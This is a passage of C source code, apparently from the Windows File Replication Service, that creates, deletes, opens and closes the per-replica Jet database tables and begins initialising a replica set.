    FrsFree(TraversedWorkingPath);
    FrsFree(ReplicaStage);
    FrsFree(DbReplicaRoot);
    FrsFree(DbReplicaStage);

    return FStatus;
}


ULONG
DbsCreateReplicaTables (
    IN PTHREAD_CTX  ThreadCtx,
    IN PREPLICA     Replica,
    IN PTABLE_CTX   TableCtx
    )
/*++

Routine Description:

    This function creates a set of jet tables for the new replica set.
    The TableCtx parameter is initialized for a config record.

    If we fail to create a table then the create table
    fails and any residue is cleaned up via Jet tran rollback.
    We also delete any of the other tables in the group that were
    created successfully.

Arguments:

    ThreadCtx   - Thread context, provides session and database IDs.
    Replica
    TableCtx

Return Value:

    Frs Status code.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsCreateReplicaTables:"

    DWORD                WStatus;
    ULONG                FStatus                = FrsErrorSuccess;
    JET_ERR              jerr, jerr1;
    JET_SESID            Sesid;
    ULONG                i;
    PCHAR                ConfigTableName;
    JET_TABLECREATE      TableCreate;
    PCONFIG_TABLE_RECORD ConfigRecord;
    DWORD                MemberSize;
    PCHAR                MemberName;
    DWORD                FilterSize;
    PCHAR                Filter;

    GUID                 ReplicaRootGuid;
    CHAR                 TemplateName[JET_cbNameMost];
    CHAR                 TableName[JET_cbNameMost];

    Sesid = ThreadCtx->JSesid;

    FStatus = DbsCheckForOverlapErrors(Replica);
    if (!FRS_SUCCESS(FStatus)) {
        return FStatus;
    }

    //
    // Cleanup the root directory
    //     Delete preinstall directory
    //     Delete preexisting directory
    //     move existing files into preexisting directory
    //
    WStatus = DbsPrepareRoot(Replica);
    if (!WIN_SUCCESS(WStatus)) {
        DPRINT2_WS(0, ":S: ERROR - DbsPrepareRoot(%ws, %s);", Replica->Root,
                   (BooleanFlagOn(Replica->CnfFlags, CONFIG_FLAG_PRIMARY)) ?
                    "PRIMARY" : "NOT PRIMARY",  WStatus);
        return FrsErrorPrepareRoot;
    }

    //
    // Init the config record.
    //
    Replica->Volume = FrsWcsVolume(Replica->Root);
    ConfigRecord = TableCtx->pDataRecord;
    Replica->ReplicaNumber = InterlockedIncrement(&FrsMaxReplicaNumberUsed);
    DbsDBInitConfigRecord(TableCtx,
                          Replica->ReplicaName->Guid,
                          Replica->ReplicaName->Name,
                          Replica->ReplicaNumber,
                          Replica->Root,    // Root Path
                          Replica->Stage,   // Staging Path
                          Replica->Volume);

    //
    // Originiator Guid
    //
    COPY_GUID(&Replica->ReplicaVersionGuid, &ConfigRecord->ReplicaVersionGuid);

    //
    // Config record flags (CONFIG_FLAG_... in schema.h)
    //
    ConfigRecord->CnfFlags = Replica->CnfFlags;

    //
    // FRS Replica Set Object Flags.
    //
    ConfigRecord->ReplicaSetFlags = Replica->FrsRsoFlags;

    //
    // Root Guid
    //
    FrsUuidCreate(&ReplicaRootGuid);
    FrsFree(Replica->ReplicaRootGuid);
    Replica->ReplicaRootGuid = FrsDupGuid(&ReplicaRootGuid);
    COPY_GUID(&ConfigRecord->ReplicaRootGuid, Replica->ReplicaRootGuid);

    //
    // Tombstone
    //
    COPY_TIME(&ConfigRecord->MembershipExpires, &Replica->MembershipExpires);

    //
    // Set Type
    //
    ConfigRecord->ReplicaSetType = Replica->ReplicaSetType;

    //
    // Set Guid
    //
    COPY_GUID(&ConfigRecord->ReplicaSetGuid, Replica->SetName->Guid);

    //
    // Set Name
    //
    wcsncpy(ConfigRecord->ReplicaSetName, Replica->SetName->Name, DNS_MAX_NAME_LENGTH + 1);
    ConfigRecord->ReplicaSetName[DNS_MAX_NAME_LENGTH] = L'\0';

    //
    // Member Guid
    // Replication to two different directories on the same computer
    // is allowed. Hence, a replica set will have multiple configrecords
    // in the DB, one for each "member". The member guid is used for
    // uniqueness.
    //
    COPY_GUID(&ConfigRecord->ReplicaMemberGuid, Replica->MemberName->Guid);
    //
    // Member Name
    //
    MemberSize = (wcslen(Replica->MemberName->Name) + 1) * sizeof(WCHAR);
    FStatus = DBS_REALLOC_FIELD(TableCtx, ReplicaMemberNamex, MemberSize, FALSE);
    if (!FRS_SUCCESS(FStatus)) {
        DPRINT_FS(0, "ERROR - reallocating member name.", FStatus);
        Replica->FStatus = FStatus;
    } else {
        MemberName = DBS_GET_FIELD_ADDRESS(TableCtx, ReplicaMemberNamex);
        CopyMemory(MemberName, Replica->MemberName->Name, MemberSize);
    }

    //
    // Pack other fields into the config record blob
    //
    FStatus = DbsPackIntoConfigRecordBlobs(Replica, TableCtx);
    if (!FRS_SUCCESS(FStatus)) {
        DPRINT_FS(0, "ERROR - packing blob.", FStatus);
        Replica->FStatus = FStatus;
    }


    // Note: look for filters in per-replica set reg keys too. future.

    //
    // File filter
    //
    // For now the inclusion filter is registry only and is not saved in the config record.
    //
    FrsFree(Replica->FileInclFilterList);
    Replica->FileInclFilterList =  FrsWcsDup(RegistryFileInclFilterList);

    if (!Replica->FileFilterList) {
        Replica->FileFilterList =  FRS_DS_COMPOSE_FILTER_LIST(
                                       NULL,
                                       RegistryFileExclFilterList,
                                       DEFAULT_FILE_FILTER_LIST);
    }

    FilterSize = (wcslen(Replica->FileFilterList) + 1) * sizeof(WCHAR);
    FStatus = DBS_REALLOC_FIELD(TableCtx, FileFilterListx, FilterSize, FALSE);
    if (!FRS_SUCCESS(FStatus)) {
        DPRINT_FS(0, "ERROR - reallocating file filter.", FStatus);
        Replica->FStatus = FStatus;
    } else {
        Filter = DBS_GET_FIELD_ADDRESS(TableCtx, FileFilterListx);
        CopyMemory(Filter, Replica->FileFilterList, FilterSize);
    }

    //
    // Directory filter
    //
    // For now the inclusion filter is registry only and is not saved in the config record.
    //
    FrsFree(Replica->DirInclFilterList);
    Replica->DirInclFilterList =  FrsWcsDup(RegistryDirInclFilterList);

    if (!Replica->DirFilterList) {
        Replica->DirFilterList =  FRS_DS_COMPOSE_FILTER_LIST(
                                      NULL,
                                      RegistryDirExclFilterList,
                                      DEFAULT_DIR_FILTER_LIST);
    }

    FilterSize = (wcslen(Replica->DirFilterList) + 1) * sizeof(WCHAR);
    FStatus = DBS_REALLOC_FIELD(TableCtx, DirFilterListx, FilterSize, FALSE);
    if (!FRS_SUCCESS(FStatus)) {
        DPRINT_FS(0, "ERROR - reallocating dir filter.", FStatus);
        Replica->FStatus = FStatus;
    } else {
        Filter = DBS_GET_FIELD_ADDRESS(TableCtx, DirFilterListx);
        CopyMemory(Filter, Replica->DirFilterList, FilterSize);
    }

    GetSystemTimeAsFileTime(&ConfigRecord->LastDSChangeAccepted);

    if (!FRS_SUCCESS(Replica->FStatus)) {
        return Replica->FStatus;
    }

    //
    // First try to read the config entry for a replica with this name.
    // If we find it then fail with JET_errTableDuplicate.
    //
    // Only the ReplicaNumber and ReplicaMemberGuid need to be unique for
    // each replica set.  See index defs in schema.c.
    //

    jerr = JetBeginTransaction(Sesid);
    CLEANUP1_JS(0, "ERROR - JetBeginTran failed creating tables for replica %d.",
                Replica->ReplicaNumber, jerr, ERROR_RETURN_0);

    //
    // DEBUG OPTION: Fill up the volume containing the database
    //
    DBG_DBS_OUT_OF_SPACE_FILL(DBG_DBS_OUT_OF_SPACE_OP_CREATE);

    //
    // Create the initial set of tables for a replica set with ReplicaNumber.
    //
    for (i=0; i<TABLE_TYPE_MAX; i++) {

        //
        // To avoid a mutex we copy the DBTable struct to a local and init
        // the table name here instead of writing into the global struct.
        //
        CopyMemory(&TableCreate, &DBTables[i], sizeof(JET_TABLECREATE));
        TableCreate.szTableName = TableName;

        //
        // Create a unique table name by suffixing the replica number to
        // the base table name.
        //
        sprintf(TableName, "%s%05d", DBTables[i].szTableName, Replica->ReplicaNumber);

        //
        // The first set of table creates use replica number
        // DBS_TEMPLATE_TABLE_NUMBER (0) to make a set of template tables
        // can be used by subsequent creates of the same table type.
        // This ensures that the column IDs of each table of a given type
        // are the same.  Also set the grbit to FixedDDL.  This means we
        // can't add indexes or columns but the access to the table is faster
        // because jet can avoid taking some critical sections.
        // Set the TemplateTableName to the name of the Template table (0).
        //
        TableCreate.grbit = JET_bitTableCreateFixedDDL;
        TableCreate.rgcolumncreate = NULL;
        TableCreate.cColumns = 0;
        TableCreate.rgindexcreate = NULL;
        TableCreate.cIndexes = 0;

        sprintf(TemplateName, "%s%05d", DBTables[i].szTableName, DBS_TEMPLATE_TABLE_NUMBER);
        TableCreate.szTemplateTableName = TemplateName;

        jerr = DbsCreateJetTable(ThreadCtx, &TableCreate);
        CLEANUP1_JS(1, "Table %s create error:", TableName, jerr, ERROR_RETURN);

        jerr = JetCloseTable(Sesid, TableCreate.tableid);
        CLEANUP1_JS(1, "Table %s close error:", TableName, jerr, ERROR_RETURN);

    }

    //
    // Tables were created.  Now init and write a config record for this
    // replica set member.
    //

    ConfigTableName = TableCtx->pJetTableCreate->szTableName;

    //
    // Write the config record supplied in the TableCtx parameter to the
    // config table.  The table is opened as needed.
    //
    DBS_DISPLAY_RECORD_SEV(4, TableCtx, FALSE);

    jerr = DbsWriteReplicaTableRecord(ThreadCtx,
                                      FrsInitReplica->ReplicaNumber,
                                      TableCtx);
    //
    // DEBUG OPTION - Trigger an out-of-space error
    //
    DBG_DBS_OUT_OF_SPACE_TRIGGER(jerr);
    CLEANUP2_JS(0, "ERROR - DbsWriteReplicaTableRecord for table (%s), replica (%ws),",
                ConfigTableName, ConfigRecord->ReplicaSetName, jerr, ERROR_RETURN);

    //
    // Close the table, reset TableCtx Tid and Sesid.  Macro writes 1st arg.
    //
    DbsCloseTable(jerr, Sesid, TableCtx);
    CLEANUP1_JS(0, "ERROR - Table %s close:", ConfigTableName, jerr, ERROR_RETURN);

    //
    // Commit the table create and the config entry write.
    //
    jerr = JetCommitTransaction(Sesid, 0);
    CLEANUP1_JS(0, "ERROR - JetCommitTran failed creating tables for replica %d.",
                Replica->ReplicaNumber, jerr, ERROR_RETURN);

    //
    // DEBUG OPTION: Delete fill file
    //
    DBG_DBS_OUT_OF_SPACE_EMPTY(DBG_DBS_OUT_OF_SPACE_OP_CREATE);

    //
    // New set of tables added for Replica.
    //
    return FrsErrorSuccess;


//
// Delete any tables we created before the failure occurred.
//
ERROR_RETURN:

    //
    // Roll back the table creates.
    //
    jerr1 = JetRollback(Sesid, 0);
    DPRINT1_JS(0, "ERROR - JetRollback failed creating tables for replica %d.",
               Replica->ReplicaNumber, jerr1);

    //
    // DEBUG OPTION: Delete fill file
    //
    DBG_DBS_OUT_OF_SPACE_EMPTY(DBG_DBS_OUT_OF_SPACE_OP_CREATE);

    //
    // Shutdown if the database volume is full
    //
    DbsExitIfDiskFull(jerr1);
    DbsExitIfDiskFull(jerr);

ERROR_RETURN_0:

    return DbsTranslateJetError(jerr, FALSE);
}




JET_ERR
DbsDeleteReplicaTables (
    IN PTHREAD_CTX  ThreadCtx,
    IN OUT PREPLICA Replica
    )
/*++

Routine Description:

    This function deletes a set of jet tables for the given replica set.
    It gets the necessary paramters from the Replica struct
    The config record is deleted..

Arguments:

    ThreadCtx   - The thread context, provides session ID and database ID.

    Replica     - The Replica context.

Return Value:

    Status code.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsDeleteReplicaTables:"

    JET_ERR      jerr, jerr1;
    JET_SESID    Sesid;
    JET_DBID     Dbid;
    PTABLE_CTX   TableCtx;
    ULONG        i;
    ULONG        ReplicaNumber = Replica->ReplicaNumber;
    CHAR         TableName[JET_cbNameMost];
    PWCHAR       PreInstallPath = NULL;

    PCONFIG_TABLE_RECORD ConfigRecord;

    //
    // Check if this is the init record number or the template table number.
    //
    if ((Replica->ReplicaNumber == FRS_SYSTEM_INIT_REPLICA_NUMBER) ||
        WSTR_EQ(Replica->ReplicaName->Name, NTFRS_RECORD_0)        ||
        WSTR_EQ(Replica->Root, FRS_SYSTEM_INIT_PATH)               ||
        WSTR_EQ(Replica->ReplicaName->Name, FRS_SYSTEM_INIT_RECORD) ) {
        DPRINT1(4, "ERROR: Invalid replica number: %d\n", ReplicaNumber);
        return JET_errSuccess;
    }

    //
    // Delete all preinstall files and preinstall directory.
    //
    PreInstallPath = FrsWcsPath(Replica->Root, NTFRS_PREINSTALL_DIRECTORY);
    DPRINT1(4,"++ Deleting Preinstall directory %ws\n", PreInstallPath);
    FrsDeletePath(PreInstallPath, ENUMERATE_DIRECTORY_FLAGS_ERROR_CONTINUE);
    FrsFree(PreInstallPath);

    Sesid = ThreadCtx->JSesid;
    Dbid  = ThreadCtx->JDbid;

    jerr = JetBeginTransaction(Sesid);
    CLEANUP1_JS(0, "ERROR - JetBeginTran failed deleting tables for replica %d.",
                   ReplicaNumber, jerr, ERROR_RETURN_0);

    //
    // DEBUG OPTION: Cause out of space errors
    //
    DBG_DBS_OUT_OF_SPACE_FILL(DBG_DBS_OUT_OF_SPACE_OP_DELETE);

    //
    // Delete set of tables for a replica set with ReplicaNumber.
    //
    for (i=0; i<TABLE_TYPE_MAX; i++) {

        //
        // Create the table name by suffixing the replica number to
        // the base table name.  Then delete the table.  The table may not be
        // found if we crashed during create or had to stop part way through
        // a delete because table was in use.
        //
        sprintf(TableName, "%s%05d", DBTables[i].szTableName, ReplicaNumber);

        DPRINT1(4, ":S: Deleting Table %s: \n", TableName);

        jerr = JetDeleteTable(Sesid, Dbid, TableName);
        if ((!JET_SUCCESS(jerr)) && (jerr != JET_errObjectNotFound)) {
            if (jerr == JET_errCannotDeleteTemplateTable) {
                DPRINT2(1, "++ Table %s delete error: %d. Ignore error.\n", TableName, jerr);
            } else {
                DPRINT1_JS(1, "++ Table %s delete error:", TableName, jerr);
            //
            // Commit where we are and stop. The replica state tells us the delete
            // has started.
            //
            goto COMMIT;
            }
        }
    }

    //
    //
    // Now delete the config record.
    //
    // Also - Need to check if replica name is in use when creating a new replica.
    //
    //        We could restrict reading and writing of the config entry to
    //        a single thread or a special class of threads so all threads
    //        don't have to open the config table.
    //        We could fill in fields of the config entry without doing the
    //        actual write here. But it's best to make it all part of one
    //        transaction.
    TableCtx = &FrsInitReplica->ConfigTable;
    ConfigRecord = (PCONFIG_TABLE_RECORD) (TableCtx->pDataRecord);

    //
    // delete the replica config record by an Index on the ReplicaNumber
    //

    jerr = DbsDeleteRecord(ThreadCtx, (PVOID) &ReplicaNumber, ReplicaNumberIndexx, TableCtx);

    //
    // DEBUG OPTION - Trigger an out-of-space error
    //
    DBG_DBS_OUT_OF_SPACE_TRIGGER(jerr);

    CLEANUP_JS(0, "++ ERROR - DbsDeleteRecord:", jerr, ERROR_RETURN);


COMMIT:
    //
    // Commit the transaction.
    //
    jerr = JetCommitTransaction(Sesid, 0);
    CLEANUP1_JS(0, "++ ERROR - JetCommitTran failed creating tables for replica %d.",
                ReplicaNumber, jerr, ERROR_RETURN);

    //
    // DEBUG OPTION: Delete fill file
    //
    DBG_DBS_OUT_OF_SPACE_EMPTY(DBG_DBS_OUT_OF_SPACE_OP_DELETE);

    return JET_errSuccess;


//
// Delete failed.
//
ERROR_RETURN:

ERROR_ROLLBACK:
    //
    // Roll back the transaction.
    //
    jerr1 = JetRollback(Sesid, 0);
    DPRINT1_JS(0, "++ ERROR - DbsDeleteReplicaTables: JetRollback failed on replica number %d.",
               ReplicaNumber, jerr1);

    //
    // DEBUG OPTION: Delete fill file
    //
    DBG_DBS_OUT_OF_SPACE_EMPTY(DBG_DBS_OUT_OF_SPACE_OP_DELETE);

    //
    // Shutdown if the database volume is full
    //
    DbsExitIfDiskFull(jerr1);
    DbsExitIfDiskFull(jerr);

ERROR_RETURN_0:

    return jerr;
}


JET_ERR
DbsOpenReplicaTables (
    IN PTHREAD_CTX  ThreadCtx,
    IN PREPLICA     Replica,
    IN PREPLICA_THREAD_CTX RtCtx
    )
/*++

Routine Description:

    This function opens a set of Jet tables for the given replia and thread.
    The Jet table handles are thread specific because transaction state is
    per-thread.  So each thread that needs to access the Jet tables for a
    given replica must first open the tables.  The replica number comes from
    the Replica struct.

Arguments:

    ThreadCtx   - The thread context, provides session ID and database ID.

    Replica     - The Replica context, provides the table list for this replica.

    RtCtx       - Store the table ids/handles for the opened tables.

Return Value:

    Status code.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsOpenReplicaTables:"

    JET_ERR      jerr, jerr1 = JET_errSuccess;
    JET_TABLEID  Tid;

    ULONG        i;
    NTSTATUS     Status;
    ULONG        ReplicaNumber;
    PTABLE_CTX   TableCtx;
    PJET_TABLECREATE DBJTableCreate;
    CHAR         TableName[JET_cbNameMost];
    JET_TABLEID  FrsOpenTableSaveTid;   // for FrsOpenTableMacro DEBUG


    ReplicaNumber = Replica->ReplicaNumber;

    //
    // Get the base of the array of TableCtx structs from the replica thread
    // context struct and the base of the table create structs.
    //
    TableCtx = (RtCtx)->RtCtxTables;
    DBJTableCreate = DBTables;

    DUMP_TABLE_CTX(TableCtx);

    //
    // Open the initial set of tables for the replica set.
    //
    for (i=0; i<TABLE_TYPE_MAX; i++) {

        TableCtx->pJetTableCreate = &DBTables[i];

        //
        // Open the table, if it's not already open. Check the session id for match.
        //
        jerr = DBS_OPEN_TABLE(ThreadCtx, TableCtx, ReplicaNumber, TableName, &Tid);
        CLEANUP1_JS(0, "++ ERROR - FrsOpenTable (%s) :", TableName, jerr, ERROR_RETURN);

        //
        // Initialize the JetSet/RetCol arrays and data record buffer addresses
        // to read and write the fields of the ConfigTable records into ConfigRecord.
        //
        DbsSetJetColSize(TableCtx);
        DbsSetJetColAddr(TableCtx);

        //
        // Allocate the storage for the variable length fields in the record and
        // update the JetSet/RetCol arrays appropriately.
        //
        Status = DbsAllocRecordStorage(TableCtx);
        CLEANUP_NT(0, "ERROR - DbsAllocRecordStorage failed to alloc buffers.",
                   Status, ERROR_RETURN);

        TableCtx += 1;
    }

    return JET_errSuccess;

//
// Close any tables that we opened.
//
ERROR_RETURN:

    jerr1 = jerr;
    jerr = DbsCloseReplicaTables(ThreadCtx, Replica, RtCtx, TRUE);
    DPRINT_JS(0, "++ ERROR - DbsCloseReplicaTables:", jerr);

    return jerr1;

}



JET_ERR
DbsCloseReplicaTables (
    IN PTHREAD_CTX  ThreadCtx,
    IN PREPLICA Replica,
    IN PREPLICA_THREAD_CTX RtCtx,
    IN BOOL SessionErrorCheck
    )
/*++

Routine Description:

    This function closes a set of Replica tables for the given ReplicaThreadCtx.

Arguments:

    ThreadCtx   - The thread context, provides session ID and database ID.
    Replica     - Ptr to Replica struct that has list head for RtCtx.
    RtCtx       - The table ids/handles for the open tables.
    SessionErrorCheck - True means generate an error message if the Session ID
                        in the ThreadCtx does not match the Session Id used
                        to open a given table in the Replica-Thread ctx.
                        False means keep quiet.
Return Value:

    Jet Status code.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsCloseReplicaTables:"

    JET_ERR      jerr, jerr1 = JET_errSuccess;
    JET_SESID    Sesid;
    ULONG        i;
    PTABLE_CTX   TableCtx;
    PCHAR        TableName;

    Sesid = ThreadCtx->JSesid;

    //
    // Get the base of the array of TableCtx structs from the replica thread
    // context struct.
    //
    TableCtx = (RtCtx)->RtCtxTables;

    //
    // Close any open tables in this replica thread context.
    //
    for (i=0; i<TABLE_TYPE_MAX; i++, TableCtx++) {

        //
        //  Check for table not open or not initialized.
        //
        if (!IS_TABLE_OPEN(TableCtx) ||
            !IS_REPLICA_TABLE(TableCtx->TableType)){
            continue;
        }

        //
        // Table is open.  Check the thread session ID for a match with the
        // session id used when the table was opened.
        //
        TableName = TableCtx->pJetTableCreate->szTableName;
        if (Sesid != TableCtx->Sesid) {
            if (SessionErrorCheck) {
                DPRINT3(0, "++ ERROR - DbsCloseReplicaTables (%s) bad sesid : %d should be %d\n",
                        TableName, Sesid, TableCtx->Sesid);
                jerr1 = JET_errInvalidSesid;
            }

        } else {
            //
            // Close the table, reset TableCtx Tid and Sesid.  Macro writes 1st arg.
            //
            DbsCloseTable(jerr1, Sesid, TableCtx);
            DPRINT1_JS(0, "++ ERROR - Table %s close :", TableName, jerr1);
        }
    }

    return jerr1;
}



FRS_ERROR_CODE
DbsCloseSessionReplicaTables (
    IN PTHREAD_CTX  ThreadCtx,
    IN OUT PREPLICA Replica
    )
/*++
Routine Description:

    Walk the Replica Thread Context list and close all tables that were opened
    by this session using the session ID in the ThreadCtx.  If the
    ReplicaCtxListHead ends up empty we then close the Replica->ConfigTable.

Arguments:

    ThreadCtx   - The thread context, provides session ID and database ID.
    Replica     - The Replica context, provides the table list for this replica.

Return Value:

    FRS Error Status code.
--*/
{
#undef DEBSUB
#define DEBSUB "DbsCloseSessionReplicaTables:"

    JET_ERR      jerr = JET_errSuccess;
    JET_SESID    Sesid;
    ULONG        i;
    FRS_ERROR_CODE FStatus, FStatus1;
    PTABLE_CTX   TableCtx;
    PCHAR        TableName;
    BOOL         UpdateConfig;
    PCONFIG_TABLE_RECORD  ConfigRecord;
    PVOLUME_MONITOR_ENTRY pVme;

    FStatus = FrsErrorSuccess;

    //
    // Shut down outbound log processing
    //
    FStatus1 = OutLogSubmit(Replica, NULL, CMD_OUTLOG_REMOVE_REPLICA);
    DPRINT2_FS(0, "ERROR removing replica %ws\\%ws :",
               Replica->ReplicaName->Name, Replica->MemberName->Name, FStatus1);
    FStatus = FRS_SUCCESS(FStatus) ? FStatus1 : FStatus;

    Sesid = ThreadCtx->JSesid;
    ForEachListEntry( &Replica->ReplicaCtxListHead, REPLICA_THREAD_CTX, ReplicaCtxList,
        //
        // loop iterator pE is type PREPLICA_THREAD_CTX.  Don't generate an
        // error message if the session ID on a table doesn't match ours.
        //
        jerr = DbsFreeRtCtx(ThreadCtx, Replica, pE, FALSE);
    );

    ConfigRecord = Replica->ConfigTable.pDataRecord;
    FRS_ASSERT(ConfigRecord != NULL);

    //
    // If the replica set membership has been deleted then we only update
    // one more time.
    //
    UpdateConfig = (IS_TIME_ZERO(Replica->MembershipExpires) ||
                   (ConfigRecord->LastShutdown < (Replica->MembershipExpires -
                                                  ReplicaTombstoneInFileTime)));
    //
    // If for some reason journaling never started for this Replica the ptr
    // to the volume Monitor entry is still NULL.
    //
    pVme = Replica->pVme;
    if ((pVme != NULL) && UpdateConfig) {
        //
        // Save the restart point for the Journal USN and the FRS Volume VSN.
        //
        FStatus1 = DbsReplicaSaveMark(ThreadCtx, Replica, pVme);
        DPRINT1_FS(0, "ERROR - DbsReplicaSaveMark on %ws.",
                   Replica->ReplicaName->Name, FStatus1);
        FStatus = FRS_SUCCESS(FStatus) ? FStatus1 : FStatus;

    } else {
        JrnlSetReplicaState(Replica, REPLICA_STATE_STOPPED);
    }

    //
    // If all Replica-Thread contexts are closed, update last shutdown time
    // and service state and close this Replica's config open.
    //
    if (FrsRtlCountList(&Replica->ReplicaCtxListHead) == 0) {
        TableCtx = &Replica->ConfigTable;

        if (ConfigRecord->ServiceState != CNF_SERVICE_STATE_CREATING) {
            //
            // If we never got out of the creating state then leave it marked
            // as creating.  This can happen when a new replica set is
            // created but the service is shutdown before it was ever
            // started up.  The result in this case is a bogus value for
            // the journal restart USN.
            //
            SET_SERVICE_STATE(Replica, CNF_SERVICE_STATE_CLEAN_SHUTDOWN);
        }

        if (UpdateConfig) {
            //
            // Update time and state fields in the config record.
            //
            GetSystemTimeAsFileTime((PFILETIME)&ConfigRecord->LastShutdown);
            FStatus1 = DbsUpdateConfigTableFields(ThreadCtx,
                                                  Replica,
                                                  CnfCloseFieldList,
                                                  CnfCloseFieldCount);
            FStatus = FRS_SUCCESS(FStatus) ? FStatus1 : FStatus;
        }

        //
        // Close the table, reset the TableCtx Tid and Sesid.
        // DbsCloseTable is a Macro, writes 1st arg.
        //
        TableName = TableCtx->pJetTableCreate->szTableName;
        DbsCloseTable(jerr, Sesid, TableCtx);
        FStatus1 = DbsTranslateJetError(jerr, FALSE);
        DPRINT1_FS(0, "ERROR - Table %s close :", TableName, FStatus1);
        FStatus = FRS_SUCCESS(FStatus) ? FStatus1 : FStatus;

    } else {
        DPRINT1(0, "WARNING - Not all RtCtx's closed on %ws.  Config record still open.\n",
                Replica->ReplicaName->Name);
        FStatus1 = FrsErrorSessionNotClosed;
        FStatus = FRS_SUCCESS(FStatus) ? FStatus1 : FStatus;
    }

    //
    // Close the preinstall directory.
    //
    if (FRS_SUCCESS(FStatus) &&
        HANDLE_IS_VALID(Replica->PreInstallHandle)) {
        FRS_CLOSE(Replica->PreInstallHandle);
    }

    Replica->FStatus = FStatus;     // Note: not thread safe.

    return FStatus;
}



ULONG
DbsInitOneReplicaSet(
    PREPLICA Replica
    )
/*++

Routine Description:

    This routine inits a new replica set and starts replication.
    Initialize the replica tables with the initial directory contents
    pause the journal, update the filter table, and restarts the journal.

Arguments:

    Replica -- ptr to an initialized Replica struct.

Thread Return Value:

    An FrsError status.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsInitOneReplicaSet:"

    ULONG                 WStatus;
    ULONG                 FStatus;
    PCOMMAND_PACKET       CmdPkt;
    PCONFIG_TABLE_RECORD  ConfigRecord;
    PVOLUME_MONITOR_ENTRY pVme;
    ULONG                 NewServiceState = CNF_SERVICE_STATE_RUNNING;

    //
    // Replica set init is serialized because it involves work by both the
    // the Journal monitor thread and the Database service thread. The problem
    // arises when more than one thread calls this function (e.g. at startup)
    // because the first one to call can be returning here to unpause the
    // journal while the second thread has already paused the journal as
    // part of the CMD_JOURNAL_INIT_ONE_RS request.  One solution is to
    // create a count of pause requests active on each volume and make
    // each unpause request wait on an event until the count goes to zero.
    // Need to ensure that pause and unpause requests are balanced and that
    // any waiters are released if the journal enters the stopped or error
    // states.
    //
    // This is a performance issue so for now we just make init single threaded.
    //
    // Perf: Add pause count for multi-thread replica set init.
    //

    ACQUIRE_DBS_INIT_LOCK;

    //
    // Initialize the replica tables with the initial directory contents
    // pause the journal, update the filter table.  Journal is left paused.
    // The command is submitted to the Journal which does the first part.  It
    // then moves on to the the DB server using
    // CMD_LOAD_ONE_REPLICA_FILE_TREE to do the second part which may involve
    // creating the initial IDTable contents.  Control then moves to
    // JrnlPrepareService2 which uses the IDTable contents to init the
    // journal filter tables and parent FID table.  Finally it inserts the
    // created replica struct onto the pVme->ReplicaListHead and then
    // completes the command.  When the sync call returns, the packet has
    // been transformed into a DB request packet.
    //

    CmdPkt = FrsAllocCommand(&JournalProcessQueue, CMD_JOURNAL_INIT_ONE_RS);
    JrReplica(CmdPkt) = Replica;
    JrpVme(CmdPkt) = NULL;


    //
    // Don't free the packet when the command completes.
    //
    FrsSetCompletionRoutine(CmdPkt, FrsCompleteKeepPkt, NULL);

    //
    // SUBMIT Cmd.
    // Wait until command request is completed.  But if we timeout we can't
    // just delete the cmd packet because it may be on a list somewhere.
    //
    WStatus = FrsSubmitCommandAndWait(CmdPkt, FALSE, INFINITE);

    //
    // Check the return status.  Note: The packet is now a DB service packet
    // if it made it past the Journal init phase.
    //
    if (!WIN_SUCCESS(WStatus)) {
        DPRINT_WS(1, "CMD_JOURNAL_INIT_ONE_RS failed", WStatus);

        if (WStatus == ERROR_JOURNAL_ENTRY_DELETED) {
            JrnlSetReplicaState(Replica, REPLICA_STATE_JRNL_WRAP_ERROR);
            FStatus = FrsErrorJournalWrapError;
        } else {
            FStatus = Replica->FStatus;
            if (FRS_SUCCESS(FStatus)) {
                FStatus = FrsErrorJournalStartFailed;
            }
            JrnlSetReplicaState(Replica, REPLICA_STATE_ERROR);
        }

        FrsFreeCommand(CmdPkt, NULL);
        CmdPkt = NULL;
        goto RESUME_JOURNAL;
    }

    FStatus = CmdPkt->Parameters.DbsRequest.FStatus;
    FrsFreeCommand(CmdPkt, NULL);
    CmdPkt = NULL;

    if (!FRS_SUCCESS(FStatus)) {
        DPRINT_FS(0, "ERROR initing journal:", FStatus);
        //
        // Put replica on the fault list.
        //
        JrnlSetReplicaState(Replica, REPLICA_STATE_ERROR);
        goto RESUME_JOURNAL;
    }

    DPRINT(4, ":S: Journal Initialized success.\n");

    pVme = Replica->pVme;

    //
    // Update the save point for the VSN and USN for this replica set.
    //
    DPRINT3(4, ":S: VSN Save Triggered: NextVsn: %08x %08x  "
                                   "LastUsnSaved: %08x %08x  "
                                   "CurrUsnDone: %08x %08x\n",
            PRINTQUAD(pVme->FrsVsn),
            PRINTQUAD(pVme->LastUsnSavePoint),
            PRINTQUAD(pVme->CurrentUsnRecordDone));

    FStatus = DbsRequestSaveMark(pVme, TRUE);
    if (!FRS_SUCCESS(FStatus)) {
        DPRINT1_FS(0, "++ ERROR updating VSN, USN save point for %ws.",
                   Replica->ReplicaName->Name, FStatus);
        //
        // If we can't mark our progress then we can't start.
        // Put replica on the fault list.
        //
        JrnlSetReplicaState(Replica, REPLICA_STATE_ERROR);
        goto RESUME_JOURNAL;
    }

    //
    // As the final step before we can restart the journal for this replica set
    // we need to first re-submit any local change orders that are in the
    // inbound log to the change order process queue for the volume.
    // Allocate command packet and submit to the CO Retry thread
    // (ChgOrdRetryCS).  Wait until the command is completed.
    //
    // This scan has to be done before we start the journal otherwise we end
    // up resubmitting new local change orders a second time.
    //
    DPRINT(4, ":S: Scanning for pending local COs to retry.\n");
    ChgOrdRetrySubmit(Replica, NULL, FCN_CORETRY_LOCAL_ONLY, TRUE);

    //
    // If replay USN is not valid then pickup at JrnlReadPoint (where we left off).
    // Otherwise set the replay point to the min of replay and this replica's
    // LastUsnRecordProcessed.
    //
    if (!pVme->ReplayUsnValid) {
        pVme->ReplayUsn = LOAD_JOURNAL_PROGRESS(pVme, pVme->JrnlReadPoint);
        pVme->ReplayUsnValid = TRUE;
    }

    DPRINT1(4, ":S: ReplayUsn was:    %08x %08x\n", PRINTQUAD(pVme->ReplayUsn));

    pVme->ReplayUsn = min(pVme->ReplayUsn, Replica->LastUsnRecordProcessed);

    DPRINT1(4, ":S: ReplayUsn is now: %08x %08x\n", PRINTQUAD(pVme->ReplayUsn));

RESUME_JOURNAL:

    //
    // If this init failed and the journal had been paused then
    // reStart the journal where it left off.  Set the state to
